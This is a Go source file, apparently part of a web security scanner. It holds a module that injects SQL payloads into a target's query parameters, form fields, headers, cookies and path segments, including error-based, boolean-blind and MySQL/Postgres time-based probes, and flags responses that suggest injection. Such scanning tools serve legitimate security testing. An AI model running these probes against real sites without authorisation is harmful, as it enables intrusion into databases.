package core

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type SQLCmdType string

const (
	SQLCmdError     SQLCmdType = "error_based"
	SQLCmdBoolean   SQLCmdType = "boolean_blind"
	SQLCmdTimeBased SQLCmdType = "time_blind"
)

type SQLPayload struct {
	Value       string
	VerifyValue string // For differential analysis
	Type        SQLCmdType
	DB          string // "mysql", "postgres", etc.
}

// SQLInjectionTestingResult holds the result of the SQLInjectionTesting module execution.
type SQLInjectionTestingResult struct {
	Target  string `json:"target"`
	Payload string `json:"payload"`
	Status  string `json:"status"`
	Detail  string `json:"detail,omitempty"`
}

// SQLInjectionTesting executes the sql_injection_testing security technique.
// Description: inject malicious SQL statements into user input fields to manipulate database queries
type SQLInjectionTesting struct {
	BaseModule
	Target    string
	Threshold time.Duration
	results   []SQLInjectionTestingResult
}

// NewSQLInjectionTesting creates a new instance of SQLInjectionTesting.
func NewSQLInjectionTesting(target string) *SQLInjectionTesting {
	target = EnsureHTTPPrefix(target)
	return &SQLInjectionTesting{
		BaseModule: BaseModule{
			Client:     NewHTTPClient(15 * time.Second),
			MaxThreads: 5,
		},
		Target:    target,
		Threshold: 4 * time.Second,
	}
}

// SetCookies sets the Cookie header value for the requests.
func (m *SQLInjectionTesting) SetCookies(cookies string) {
	m.BaseModule.Cookies = cookies
}

// SetThreads sets the maximum number of concurrent threads.
func (m *SQLInjectionTesting) SetThreads(count int) {
	if count > 0 {
		m.MaxThreads = count
	}
}

// SetThreshold sets the time threshold for blind time-based injection detection.
func (m *SQLInjectionTesting) SetThreshold(threshold time.Duration) {
	m.Threshold = threshold
}

var sqlErrors = []string{
	"you have an error in your sql syntax",
	"warning: mysql",
	"unclosed quotation mark after the character string",
	"quoted string not properly terminated",
	"pg_query(): query failed: error:",
	"sqlite3.error:",
	"syntax error or access violation",
	"sql syntax error",
	"mysql_fetch_array()",
	"ora-01756",
}

type SQLValidator struct {
	Threshold time.Duration
}

func (v *SQLValidator) IsVulnerable(resp *http.Response, body string, payload SQLPayload, duration time.Duration, baseBody string) bool {
	bodyLower := strings.ToLower(body)

	switch payload.Type {
	case SQLCmdError:
		for _, sqlErr := range sqlErrors {
			if strings.Contains(bodyLower, sqlErr) {
				return true
			}
		}
	case SQLCmdTimeBased:
		if duration >= v.Threshold {
			return true
		}
	case SQLCmdBoolean:
		// Logic for boolean-blind (diffing body vs baseBody)
		// Basic implementation: if bodies are significantly different in length
		if len(body) != len(baseBody) {
			// Significant length difference (more than 5%) could indicate a different response
			diff := len(body) - len(baseBody)
			if diff < 0 {
				diff = -diff
			}
			if float64(diff)/float64(len(baseBody)+1) > 0.05 {
				return true
			}
		}
	}
	return false
}

var sqlPayloads = []SQLPayload{
	{Value: "'", Type: SQLCmdError},
	{Value: "\"", Type: SQLCmdError},
	{Value: "';--", Type: SQLCmdError},
	{Value: "' or '1'='1", Type: SQLCmdBoolean, VerifyValue: "' and '1'='2"},
	{Value: "' OR 1=1--", Type: SQLCmdBoolean, VerifyValue: "' OR 1=2--"},
	{Value: "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", Type: SQLCmdTimeBased, DB: "mysql"},
	{Value: "' AND (SELECT 1 FROM pg_sleep(5))--", Type: SQLCmdTimeBased, DB: "postgres"},
}

// Execute performs the module's core tasks concurrently using discovery.
func (m *SQLInjectionTesting) Execute(ctx context.Context) ([]SQLInjectionTestingResult, error) {
	m.results = make([]SQLInjectionTestingResult, 0)

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return nil, fmt.Errorf("failed to parse target URL: %v", err)
	}

	// 1. Discover Input Vectors
	vectors, _ := m.DiscoverVectors(parsedURL, nil, "", nil)
	if len(vectors) == 0 {
		return m.results, nil
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, m.MaxThreads)
	validator := &SQLValidator{Threshold: m.Threshold}

	for _, vector := range vectors {
		// Get base response for differential analysis
		baseBody, err := m.getBaseResponse(ctx, parsedURL, vector)
		if err != nil {
			// Log and continue with other vectors
			fmt.Printf("Warning: failed to get base response for vector %s: %v\n", vector.Key, err)
			continue
		}

		for _, payload := range sqlPayloads {
			wg.Add(1)
			go func(v InputVector, p SQLPayload, base string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				select {
				case <-ctx.Done():
					return
				default:
					m.testVector(ctx, parsedURL, v, p, base, validator)
				}
			}(vector, payload, baseBody)
		}
	}

	wg.Wait()
	return m.results, nil
}

func (m *SQLInjectionTesting) getBaseResponse(ctx context.Context, u *url.URL, vector InputVector) (string, error) {
	// Send request with original vector value to get a baseline
	req, err := m.createRequest(ctx, u, vector, vector.Value)
	if err != nil {
		return "", err
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return string(body), nil
}

func (m *SQLInjectionTesting) createRequest(ctx context.Context, u *url.URL, vector InputVector, value string) (*http.Request, error) {
	var req *http.Request
	var err error

	switch vector.Type {
	case VectorQueryParam:
		newU, _ := url.Parse(u.String())
		q := newU.Query()
		q.Set(vector.Key, value)
		newU.RawQuery = q.Encode()
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	case VectorFormBody:
		form := url.Values{}
		form.Set(vector.Key, value)
		req, err = http.NewRequestWithContext(ctx, "POST", u.String(), strings.NewReader(form.Encode()))
		if req != nil {
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		}
	case VectorHeader:
		req, err = http.NewRequestWithContext(ctx, "GET", u.String(), nil)
		if req != nil {
			if strings.HasPrefix(vector.Key, "Cookie:") {
				cookieName := strings.TrimPrefix(vector.Key, "Cookie:")
				req.AddCookie(&http.Cookie{Name: cookieName, Value: value})
			} else {
				req.Header.Set(vector.Key, value)
			}
		}
	case VectorPathSegment:
		var idx int
		_, _ = fmt.Sscanf(vector.Key, "path[%d]", &idx)
		segments := strings.Split(strings.Trim(u.Path, "/"), "/")
		if idx >= 0 && idx < len(segments) {
			segments[idx] = value
		}
		newPath := "/" + strings.Join(segments, "/")
		newU, _ := url.Parse(u.String())
		newU.Path = newPath
		req, err = http.NewRequestWithContext(ctx, "GET", newU.String(), nil)
	default:
		return nil, fmt.Errorf("unsupported vector type: %s", vector.Type)
	}

	if err != nil {
		return nil, err
	}

	if m.BaseModule.Cookies != "" {
		req.Header.Set("Cookie", m.BaseModule.Cookies)
	}

	return req, nil
}

func (m *SQLInjectionTesting) testVector(ctx context.Context, u *url.URL, vector InputVector, payload SQLPayload, baseBody string, validator *SQLValidator) {
	start := time.Now()
	req, err := m.createRequest(ctx, u, vector, payload.Value)
	if err != nil {
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	duration := time.Since(start)
	bodyBytes, _ := io.ReadAll(resp.Body)
	body := string(bodyBytes)

	if validator.IsVulnerable(resp, body, payload, duration, baseBody) {
		// Double check if it's boolean blind
		if payload.Type == SQLCmdBoolean && payload.VerifyValue != "" {
			reqVerify, err := m.createRequest(ctx, u, vector, payload.VerifyValue)
			if err == nil {
				respVerify, err := m.Client.Do(reqVerify)
				if err == nil {
					defer respVerify.Body.Close()
					bodyVerifyBytes, _ := io.ReadAll(respVerify.Body)
					bodyVerify := string(bodyVerifyBytes)

					// If the verify body is different from the payload body and similar to the base body
					// then it's a very strong indicator of SQL injection
					if bodyVerify != body && validator.IsVulnerable(nil, body, payload, 0, bodyVerify) {
						detail := fmt.Sprintf("Differential analysis confirmed boolean-blind injection. DB: %s", payload.DB)
						m.RecordPoC(req, nil, detail)
						m.addResult(vector, payload, "vulnerable", detail)
						return
					}
				}
			}
		} else {
			detail := fmt.Sprintf("SQL injection detected. Type: %s. DB: %s", payload.Type, payload.DB)
			m.RecordPoC(req, nil, detail)
			m.addResult(vector, payload, "vulnerable", detail)
		}
	}
}

func (m *SQLInjectionTesting) addResult(vector InputVector, payload SQLPayload, status string, detail string) {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	m.results = append(m.results, SQLInjectionTestingResult{
		Target:  m.Target,
		Payload: fmt.Sprintf("%s (%s)", payload.Value, vector.Key),
		Status:  status,
		Detail:  detail,
	})
}

func init() {
	RegisterModule("sql_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "http://127.0.0.1")
		onLog(fmt.Sprintf("Starting SQLInjectionTesting on: %s", target))

		tester := NewSQLInjectionTesting(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))
		threshold := PayloadInt(payload, "threshold", 4)
		tester.SetThreshold(time.Duration(threshold) * time.Second)

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
